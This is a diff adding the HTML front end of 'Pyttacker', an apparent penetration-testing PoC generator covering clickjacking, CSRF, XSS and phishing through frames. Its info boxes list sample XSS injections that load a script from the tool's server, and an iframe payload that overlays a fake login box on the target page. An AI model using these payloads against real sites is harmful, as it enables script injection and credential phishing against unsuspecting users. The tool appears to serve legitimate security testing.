@@ -1,0 +1,99 @@
+<html>
+<head>
+<title>PoC Creator</title>
+<style type="text/css">
+body,td,th {
+	font-family: Verdana, Geneva, sans-serif;
+	font-size: 10px;
+	color: #000;
+}
+h1{
+	background-color:#000;
+	color:#0C0;
+	padding: 10px;
+	}
+.info-box{
+	font-family:'Courier New', Courier, monospace;
+	border:1px black solid;
+	background-color:#FFC;
+	padding: 10px;
+}
+textarea {
+	width:100%;
+	font-family:"Courier New", Courier, monospace;
+}
+</style>
+<script type="text/javascript" src="js/main.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+</head>
+<body onLoad="start();">
+<h1>Pyttacker</h1>
+<form id='attack_form' action="notdefinedyet" method="post" target="attack_frame">
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tr valign="top">
+    <td width="30">Vector:
+      <select name="cmbmethod" size="1" id="cmbmethod" onChange="method_change();">
+        <option value="POST">POST</option>
+        <option value="GET" selected>GET</option>
+      </select>
+      </td>
+    <td><textarea rows="2" id="idurl">http://</textarea></td>
+  </tr>
+  <tr id='postdata_row' style="display:none; visibility:hidden;">
+    <td>POST data:</td>
+    <td><textarea cols="100" rows="5" id="iddata" name="postdata" style="width:100%"></textarea></td>
+  </tr>
+  <tr>
+    <td>PoC for:</td>
+    <td><select name="cmbpoc" size="1" id="cmbpoc" onChange="poc_change();">
+      <option value="xfs" selected>XFS (Cross Frame Scripting | Clickjacking)</option>
+      <option value="csrf">CSRF (Cross-site Request Forgery)</option>
+      <option value="xss">XSS (Cross-site Scripting)</option>
+      <option value="ptf">Phishing Through Frames</option>
+    </select>
+      <input type="button" value="Send" onClick="send()"/></td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+    <td>
+        <div id="xss_info" class='info-box'>
+        	Samples:
+            <br/>
+            &#39;/&gt;&lt;script&gt;alert('XSS Here!')&lt;/script&gt;&lt;div id=&#39;
+            <br/>
+        	&#39;/&gt;&lt;script src=&#39;http://<SERVER_NAME>:<SERVER_PORT>/js/xss.js&#39;&gt;&lt;/script&gt;&lt;div id=&#39;
+        	<br/>
+			&#39;/&gt;&lt;SCRIPT SRC=&#39;HTTP://<SERVER_NAME>:<SERVER_PORT>/C/XSS.JS&#39;&gt;&lt;/SCRIPT&gt;&lt;DIV ID=&#39;
+        </div>
+        <div id="ptf_info" class='info-box'>
+        	Sample:
+            <br/>
+            &#39;/&gt;&lt;iframe src=&quot;http://<SERVER_NAME>:<SERVER_PORT>/login.html&quot; style=&quot;width:270px;height:150px;position:absolute;left:50%;top:50%;margin:-75px 0 0 -135px;&quot;frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;&lt;div id=&#39;
+        </div>
+        <div id="xfs_info" class='info-box'>
+        	Manual Validation:
+            <br/>
+            Check that the Header <i><b>X-Frame-Options: SAMEORIGIN | DENY</b></i> is in the response, this tool will test based on that response header.
+        </div>
+        <div id="csrf_info" class='info-box'>
+        	Manual Validation:
+            <br/>
+            Look for Tokens, _VIEWSTATE, CSRF_GUARD or any value that seems to be random in the parameters, test submitting the form and modifying the values or just removing them and compare the responses, validate if the action is performed in the server side.
+        </div>
+     </td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+    <td><p>
+        <input type="checkbox" name="idtoiframe" id="idtoiframe">
+        <label for="idtoiframe">Display results in iFrame ? (This may not work if the target site is protected against XFS)</label>
+      </p></td>
+  </tr>
+</table>
+</form>
+<p><b>Proof of Concept:</b></p>
+<div id="div_poc"></div>
+<div id="results"></div>
+<p style="text-align:right;">by Mario Robles, Costa Rica</p>
+</body>
+</html>
